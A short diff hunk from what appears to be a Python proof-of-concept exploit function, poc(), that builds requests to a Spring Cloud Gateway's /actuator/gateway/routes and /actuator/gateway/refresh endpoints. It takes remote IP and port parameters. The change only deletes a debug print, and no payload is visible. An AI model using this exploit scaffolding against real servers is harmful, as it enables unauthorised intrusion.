@@ -33,7 +33,6 @@ def poc(target,rem_ip="127.0.0.1",rem_port="80"):
     if target[-1] == "/":
         target = target.strip("/")
     url13 = target + "/actuator/gateway/routes/" + str_code
-    print(url13)
     url2 = target + "/actuator/gateway/refresh"
     headers = {
         'Accept-Encoding': 'gzip, deflate',
